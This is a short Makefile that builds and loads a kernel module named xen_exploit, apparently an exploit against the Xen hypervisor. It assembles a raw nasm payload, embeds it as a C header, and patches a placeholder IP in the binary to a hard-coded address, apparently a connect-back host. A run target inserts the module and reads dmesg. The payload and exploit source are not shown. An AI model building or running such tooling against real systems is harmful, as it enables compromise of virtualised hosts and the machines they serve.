TARGET = xen_exploit

KDIR = /lib/modules/$(shell uname -r)/build
obj-m += $(TARGET).o

all: payload.h
	make -C $(KDIR) M=$(PWD) modules

payload.h: payload.o
	xxd -i $^ $@

payload.o: payload.nasm
	nasm -f bin -o $@ $^
	#sed -i 's/127\.000\.000\.001/192.168.1.10/' $@
	sed -i 's/127\.000\.000\.001/10.3.2.61/' $@

clean:
	make -C $(KDIR) M=$(PWD) clean
	rm -rf payload.h payload.o

run:
	insmod xen_exploit.ko && rmmod xen_exploit && dmesg

